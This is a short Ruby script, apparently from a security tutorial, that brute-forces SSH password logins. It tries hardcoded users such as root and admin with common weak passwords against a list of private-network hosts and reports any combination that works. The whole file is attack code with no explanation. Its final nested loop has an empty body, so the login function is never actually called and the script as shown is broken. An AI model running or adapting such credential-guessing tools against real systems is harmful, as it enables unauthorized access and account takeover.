#!/usr/bin/env ruby

require 'net/ssh'

def attack_ssh(host, user, password, port=22, timeout = 5)
  begin
    Net::SSH.start(host, user, :password => password,
                   :auth_methods => ["password"], :port => port,
                   :paranoid => false, :non_interactive => true, :timeout => timeout ) do |session|
      puts "Password Found: " + "#{host} | #{user}:#{password}"
    end

  rescue Net::SSH::ConnectionTimeout
    puts "[!] The host '#{host}' not alive!"
  rescue Net::SSH::Timeout
    puts "[!] The host '#{host}' disconnected/timedout unexpectedly!"
  rescue Errno::ECONNREFUSED
    puts "[!] Incorrect port #{port} for #{host}"
  rescue Net::SSH::AuthenticationFailed
    puts "[!] Wrong Password: #{host} | #{user}:#{password}"
  rescue Net::SSH::Authentication::DissallowedMethod
    puts "[!] The host '#{host}' doesn't accept password authentication method."
  end
end


hosts = ['192.168.0.1', '192.168.0.4', '192.168.0.50']
users = ['root', 'admin', 'rubyfu']
passs = ['admin1234', 'P@ssw0rd', '123456', 'AdminAdmin', 'secret']

hosts.each do |host|
  users.each do |user|
    passs.each do |password|
    end
  end
end
